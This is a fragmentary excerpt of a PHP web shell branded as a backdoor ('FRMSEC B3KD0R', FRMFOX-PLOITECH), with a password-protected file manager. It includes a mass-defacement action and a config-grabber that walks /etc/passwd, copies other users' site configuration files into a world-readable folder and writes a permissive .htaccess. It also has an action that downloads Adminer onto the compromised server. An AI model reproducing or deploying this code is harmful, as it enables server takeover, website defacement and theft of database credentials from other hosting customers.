...
/* Configurasi */
$password 			= "4aff04644467e99de36ccb57c924e08d";   // frmploitech
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<link rel='icon' type='image/png' href='https://i.ibb.co/xgdP7cT/1595435846588.png'/>
		<meta name='author' content='FRMFOX'/>
		<meta name='copyright' content='FRMFOX'/>
		<meta name='description' content='FRMSEC B3KD0R'>
  ...
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">Welcome Sir</h2><hr>
    	<img src="https://i.ibb.co/bKKnLnT/20210304-185516.png" class="mx-auto d-block"><hr>
    		<form method="post">
    	<div class="row">
    		<div class="col">
    	...
    	<hr>
    	<center>
    		<small>COPYRIGHT &copy; <a href="https://frmfox.coolpage.biz">FRMFOX-PLOITECH</a></small>
    	</center>
    </div>
...
<html>
	...
	<body class='text-light'>
		...
		body{background-color:black;}
			...
			.about .card-body .img{
				position: relative;
				background: url('https://i.ibb.co/xgdP7cT/1595435846588.png');
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='https://frmfox.coolpage.biz'>[ ! ] FRMFOX-PLOITECH [ ! ]</h1>
			<center><p># Calm Down - Professional - Take Over #</a></p></center>
			<hr/>";
		//keluar
	...
	if($_GET['aksi'] == 'MassDeface') {
		...
		echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='Touched by FRMFOX-PLOITECH'></textarea><br/>
	...
	*/
	if($_GET['aksi'] == 'config') {
		...
		$con = mkdir("frmsec_configs", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("frmsec_configs/.htaccess","w");
		fwrite($htc, $isi_htc);
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("frmsec_configs/$user_con-$nama_config.txt","w");
		...
		echo "<center><a href='?dir=$path/frmsec_configs'><font color=lime>Done</font></a></center>";
	}
	...
	*/
	if($_GET['aksi'] == 'adminer') {
		...
		if(file_exists('adminer.php')) {
			...
			if(adminer("https://github.com/vrana/adminer/releases/download/v4.8.0/adminer-4.8.0.php","adminer.php")) {
...
if($ext == "php") {
		...
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://frmfox.coolpage.biz">FRMFOX-PLOITECH</a></small></center>';
?>